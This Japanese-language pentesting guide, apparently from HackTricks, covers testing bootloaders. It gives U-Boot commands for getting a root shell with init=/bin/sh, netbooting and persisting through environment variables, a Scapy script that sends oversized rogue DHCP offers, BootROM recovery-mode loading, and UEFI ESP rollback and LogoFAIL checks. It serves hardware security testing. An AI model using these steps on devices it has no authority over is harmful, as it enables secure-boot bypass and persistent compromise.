# ブートローダーのテスト

{{#include ../../banners/hacktricks-training.md}}

デバイスの起動設定を変更し、U-Boot や UEFI クラスのローダーをテストするために、以下の手順を推奨します。早期のコード実行を得ること、署名/ロールバック保護の評価、リカバリやネットワークブート経路の悪用に焦点を当ててください。

関連: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot の手早い攻め方と環境の悪用

1. インタプリタシェルにアクセスする
- 起動中に既知のブレークキー（多くの場合は任意のキー、0、スペース、あるいはボード固有の「マジック」シーケンス）を押して、`bootcmd` が実行される前に U-Boot のプロンプトに落とす。

2. ブート状態と変数を調べる
- 便利なコマンド:
- `printenv` (環境のダンプ)
- `bdinfo` (ボード情報、メモリアドレス)
- `help bootm; help booti; help bootz` (サポートされているカーネル起動方法)
- `help ext4load; help fatload; help tftpboot` (利用可能なローダ)

3. ブート引数を変更して root shell を得る
- カーネルが通常の init の代わりにシェルに落ちるように `init=/bin/sh` を追加:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. 自分の TFTP サーバから Netboot する
- ネットワークを設定して LAN からカーネル/FIT イメージを取得:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 環境経由で変更を永続化する
- env ストレージが書き込み保護されていなければ、制御を永続化できる:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` のようなフォールバック経路に影響する変数を確認。誤設定された値はシェルへの繰り返しの侵入を許すことがある。

6. デバッグ/安全でない機能を確認する
- 次のような点を探す: `bootdelay` > 0、`autoboot` 無効化、制限なしの `usb start; fatload usb 0:1 ...`、シリアル経由の `loady`/`loads` の許可、未署名のメディアからの `env import`、署名チェックなしでロードされるカーネル/ramdisk。

7. U-Boot イメージ/検証テスト
- プラットフォームが FIT イメージで secure/verified boot を主張している場合は、未署名や改ざんしたイメージを試す:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` がない、あるいは古い `verify=n` 振る舞いがある場合、任意のペイロードをブートできることが多い。

## ネットワークブートの攻撃面 (DHCP/PXE) とローグサーバ

8. PXE/DHCP パラメータのファジング
- U-Boot のレガシーな BOOTP/DHCP 処理にはメモリ安全性の問題があることがある。例えば CVE‑2024‑42040 は、細工された DHCP 応答により U-Boot のメモリからバイトが wire 上に leak されることを記述している。option 67 bootfile-name、vendor options、file/servername フィールドのような過度に長い/エッジケースな値で DHCP/PXE のコードパスをテストし、ハングや leak がないか観察する。
- netboot 中のブートパラメータに負荷をかけるための最小限の Scapy スニペット:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- また、PXE filename フィールドが OS 側のプロビジョニングスクリプトに連鎖されたときに、シェル/ローダロジックへサニタイズなしで渡されるかも検証する。

9. Rogue DHCP サーバによるコマンドインジェクションのテスト
- ローグ DHCP/PXE サービスをセットアップし、filename や options フィールドに文字を注入してブートチェーンの後段でコマンド解釈器に到達できるか試す。Metasploit の DHCP auxiliary、`dnsmasq`、あるいはカスタム Scapy スクリプトが有用。まずはラボネットワークを隔離すること。

## 通常のブートを上書きする SoC の BootROM リカバリモード

多くの SoC は BootROM の「loader」モードを公開しており、flash イメージが無効でも USB/UART 経由でコードを受け入れる。secure-boot の fuse が焼かれていなければ、チェーンの非常に早い段階で任意のコード実行を提供することがある。

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- 例: `imx-usb-loader u-boot.imx` でカスタム U-Boot を RAM にプッシュして実行。
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- 例: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` または `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- 例: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` でローダをステージし、カスタム U-Boot をアップロード。

デバイスに secure-boot 用の eFuses/OTP が焼かれているか評価すること。そうでない場合、BootROM のダウンロードモードは上位の検証（U-Boot、カーネル、rootfs）を頻繁にバイパスし、SRAM/DRAM から直接最初のステージペイロードを実行する。

## UEFI/PC クラスのブートローダ: クイックチェック

10. ESP の改ざんとロールバックのテスト
- EFI System Partition (ESP) をマウントしてローダコンポーネントを確認: `EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、ベンダーロゴのパスなど。
- Secure Boot の revocations (dbx) が最新でない場合、ダウングレードまたは既知の脆弱な署名済みブートコンポーネントで起動を試す。プラットフォームが古い shim/bootmanager をまだ信頼している場合、ESP から独自のカーネルや `grub.cfg` を読み込んで永続性を得られることが多い。

11. ブートロゴ解析バグ (LogoFAIL クラス)
- 多くの OEM/IBV ファームウェアは、DXE でブートロゴを処理する際の画像パースの脆弱性を抱えていた。攻撃者が ESP にベンダー固有のパス（例: `\EFI\<vendor>\logo\*.bmp`）で細工した画像を置ける場合、Secure Boot が有効でも早期ブート中のコード実行が可能になることがある。プラットフォームがユーザ供給のロゴを受け入れるか、そのパスが OS から書き込み可能かをテストする。

## ハードウェア上の注意

起動初期に SPI/NAND フラッシュに触れる際（例: 読み取りをバイパスするためにピンをグランドするなど）は注意し、必ずフラッシュのデータシートを参照すること。タイミングの合わないショートはデバイスやプログラマを破損する可能性がある。

## ノートと追加のヒント

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試して、環境 blob を RAM とストレージ間で移動する; 一部プラットフォームはリムーバブルメディアから認証なしで env を import させることがある。
- extlinux.conf 経由で起動する Linux ベースのシステムに永続化するには、ブートパーティションの `APPEND` 行を変更して `init=/bin/sh` や `rd.break` を注入するだけで十分なことが多い（署名チェックが無い場合）。
- userland が `fw_printenv/fw_setenv` を提供している場合、`/etc/fw_env.config` が実際の env ストレージと一致しているか検証する。誤設定されたオフセットにより誤った MTD 領域の読み書きが可能になる。

## 参考

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
